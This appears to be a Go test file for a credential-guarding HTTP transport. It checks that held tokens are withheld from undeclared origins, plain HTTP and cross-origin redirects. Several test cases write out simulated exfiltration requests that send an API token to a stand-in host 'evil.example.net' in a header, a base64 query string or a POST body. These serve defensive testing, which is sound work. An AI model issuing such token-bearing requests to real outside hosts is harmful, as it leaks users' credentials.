// Copyright 2026 Servosity Inc. and msp-skills contributors. Licensed under Apache-2.0. See LICENSE.

package credkit

import (
	"context"
	"crypto/tls"
	"encoding/base64"
	"errors"
	"io"
	"net"
	"net/http"
	"net/http/httptest"
	"strings"
	"sync/atomic"
	"testing"
)

const apiTok = "api-token-0123456789"

// guarded is a client whose every connection, whatever the URL's host and
// port, reaches srv; hits counts the requests srv received.
func guarded(t *testing.T, srv *httptest.Server) *http.Client {
	t.Helper()
	addr := srv.Listener.Addr().String()
	inner := &http.Transport{
		DialContext: func(ctx context.Context, network, _ string) (net.Conn, error) {
			return (&net.Dialer{}).DialContext(ctx, network, addr)
		},
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, //nolint:gosec // test server
	}
	return &http.Client{Transport: Transport(inner)}
}

func testServer(t *testing.T, tlsOn bool, h http.HandlerFunc) (*httptest.Server, *int64) {
	t.Helper()
	var hits int64
	wrapped := func(w http.ResponseWriter, r *http.Request) {
		atomic.AddInt64(&hits, 1)
		if h != nil {
			h(w, r)
		}
	}
	var s *httptest.Server
	if tlsOn {
		s = httptest.NewTLSServer(http.HandlerFunc(wrapped))
	} else {
		s = httptest.NewServer(http.HandlerFunc(wrapped))
	}
	t.Cleanup(s.Close)
	return s, &hits
}

func outboundDecl(allowed ...string) Declarations {
	return Declarations{
		SecretEnv:        []string{"CK_TOKEN"},
		CredentialFields: []string{"password"},
		ResponseFields:   []string{"access_token"},
		Origins:          []Origin{{Source: "env:CK_TOKEN", Allowed: allowed}, {Source: "*", Allowed: allowed}},
	}
}

func get(c *http.Client, url string, hdr ...string) error {
	req, _ := http.NewRequest("GET", url, nil)
	for i := 0; i+1 < len(hdr); i += 2 {
		req.Header.Set(hdr[i], hdr[i+1])
	}
	resp, err := c.Do(req)
	if err == nil {
		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()
	}
	return err
}

func TestContract2cAllowedOriginIsTheProgramWorking(t *testing.T) {
	srv, hits := testServer(t, true, nil)
	resetForTest(outboundDecl("https://api.example.com"))
	Hold("env:CK_TOKEN", apiTok)
	if err := get(guarded(t, srv), "https://API.example.com/v1", "Authorization", "Bearer "+apiTok); err != nil {
		t.Fatalf("request to an allowed origin refused: %v", err)
	}
	if *hits != 1 {
		t.Fatal("the request did not reach the server")
	}
}

func TestContract2cOffOriginRefusedInAnyForm(t *testing.T) {
	srv, hits := testServer(t, true, nil)
	resetForTest(outboundDecl("https://api.example.com"))
	Hold("env:CK_TOKEN", apiTok)
	c := guarded(t, srv)
	for name, call := range map[string]func() error{
		"header": func() error { return get(c, "https://evil.example.net/", "Authorization", "Bearer "+apiTok) },
		"query base64": func() error {
			return get(c, "https://evil.example.net/?x="+base64.URLEncoding.EncodeToString([]byte(apiTok)))
		},
		"custom header": func() error { return get(c, "https://evil.example.net/", "X-Note", strings.ToUpper(apiTok)) },
		"body": func() error {
			resp, err := c.Post("https://evil.example.net/", "application/json", strings.NewReader(`{"note":"`+apiTok+`"}`))
			if err == nil {
				resp.Body.Close()
			}
			return err
		},
	} {
		if err := call(); !errors.Is(err, ErrWithheld) {
			t.Errorf("%s: off-origin request not refused: %v", name, err)
		}
	}
	if *hits != 0 {
		t.Errorf("%d refused requests reached the server", *hits)
	}
}

func TestContract2cPlainHTTPRefused(t *testing.T) {
	srv, hits := testServer(t, false, nil)
	resetForTest(outboundDecl("https://api.example.com", "http://api.example.com"))
	Hold("env:CK_TOKEN", apiTok)
	if err := get(guarded(t, srv), "http://api.example.com/", "Authorization", "Bearer "+apiTok); !errors.Is(err, ErrWithheld) {
		t.Errorf("credential over plain http not refused: %v", err)
	}
	if err := get(guarded(t, srv), "http://api.example.com/"); err != nil {
		t.Errorf("plain http without a credential refused: %v", err)
	}
	if *hits != 1 {
		t.Errorf("hits = %d, want 1", *hits)
	}
}

func TestContract2cRedirects(t *testing.T) {
	var target string
	srv, _ := testServer(t, true, func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path == "/start" {
			http.Redirect(w, r, target, http.StatusFound)
		}
	})
	resetForTest(outboundDecl("https://*.example.com"))
	Hold("env:CK_TOKEN", apiTok)
	c := guarded(t, srv)
	for _, tc := range []struct {
		to      string
		refused bool
	}{
		{"https://api.example.com/next", false},     // same origin
		{"https://files.example.com/next", true},    // a different origin, though allowed
		{"https://evil.example.net/next", true},     // off-origin
		{"https://api.example.com:8443/next", true}, // a different port
	} {
		target = tc.to
		err := get(c, "https://api.example.com/start", "X-Api-Key", apiTok)
		if got := errors.Is(err, ErrWithheld); got != tc.refused {
			t.Errorf("redirect to %s: refused=%v, want %v (%v)", tc.to, got, tc.refused, err)
		}
	}
}

func TestContract2cOriginRules(t *testing.T) {
	srv, _ := testServer(t, true, nil)
	c := guarded(t, srv)
	for _, tc := range []struct {
		allowed, url string
		ok           bool
	}{
		{"https://*.example.com", "https://api.example.com/", true},
		{"https://*.example.com", "https://a.b.example.com/", true},
		{"https://*.example.com", "https://example.com/", false},
		{"https://*.example.com", "https://api.example.com:8443/", false},
		{"https://*.example.com", "https://notexample.com/", false},
		{"https://api.example.com", "https://api.example.com:443/", true},
		{"https://api.example.com:8443", "https://api.example.com:8443/", true},
		{"https://api.example.com:8443", "https://api.example.com/", false},
		{"https://xn--bcher-kva.example", "https://xn--bcher-kva.example/", true},
		{"https://XN--BCHER-KVA.example", "https://xn--bcher-kva.example/", true},
	} {
		resetForTest(outboundDecl(tc.allowed))
		Hold("env:CK_TOKEN", apiTok)
		err := get(c, tc.url, "Authorization", "Bearer "+apiTok)
		if ok := err == nil; ok != tc.ok {
			t.Errorf("allowed %s, request %s: sent=%v, want %v (%v)", tc.allowed, tc.url, ok, tc.ok, err)
		}
	}
}

func TestContract2cBaseURLOrigin(t *testing.T) {
	srv, _ := testServer(t, true, nil)
	resetForTest(outboundDecl("base_url"))
	reg.baseURL = "https://tenant.zammad.example/api/v1"
	Hold("env:CK_TOKEN", apiTok)
	c := guarded(t, srv)
	if err := get(c, "https://tenant.zammad.example/api/v1/tickets", "Authorization", "Bearer "+apiTok); err != nil {
		t.Errorf("request to the base URL refused: %v", err)
	}
	if err := get(c, "https://other.zammad.example/", "Authorization", "Bearer "+apiTok); !errors.Is(err, ErrWithheld) {
		t.Errorf("request off the base URL not refused: %v", err)
	}
}

func TestContract2cUnboundCredentialGoesNowhere(t *testing.T) {
	srv, _ := testServer(t, true, nil)
	resetForTest(Declarations{})
	if err := get(guarded(t, srv), "https://api.example.com/", "Authorization", "Bearer fresh-unbound-123"); !errors.Is(err, ErrWithheld) {
		t.Errorf("a credential bound to no origin was sent: %v", err)
	}
}

func TestContract1RequestAndResponseCredentialsHeldBeforeTheSink(t *testing.T) {
	srv, _ := testServer(t, true, func(w http.ResponseWriter, r *http.Request) {
		http.SetCookie(w, &http.Cookie{Name: "sid", Value: "cookie-secret-5678"})
		w.Header().Set("Content-Type", "application/json")
		io.WriteString(w, `{"access_token":"minted-token-abcdef","expires_in":3600}`)
	})
	resetForTest(outboundDecl("https://api.example.com"))
	c := guarded(t, srv)
	resp, err := c.Post("https://api.example.com/login", "application/x-www-form-urlencoded",
		strings.NewReader("user=me&password=form-pass-24680"))
	if err != nil {
		t.Fatal(err)
	}
	body, _ := io.ReadAll(resp.Body)
	resp.Body.Close()
	if !strings.Contains(string(body), "minted-token-abcdef") {
		t.Fatalf("the program lost the response body: %q", body)
	}
	for _, v := range []string{"form-pass-24680", "cookie-secret-5678", "minted-token-abcdef"} {
		if !isHeld(v) {
			t.Errorf("%q not held before the response reached the program", v)
		}
	}
	if isHeld("3600") || isHeld("me") {
		t.Error("an undeclared field was held")
	}
	// The minted token is bound to its declared origins.
	if err := get(c, "https://evil.example.net/", "Authorization", "Bearer minted-token-abcdef"); !errors.Is(err, ErrWithheld) {
		t.Errorf("minted token sent off-origin: %v", err)
	}
	if err := get(c, "https://api.example.com/me", "Authorization", "Bearer minted-token-abcdef"); err != nil {
		t.Errorf("minted token refused on its own origin: %v", err)
	}
}
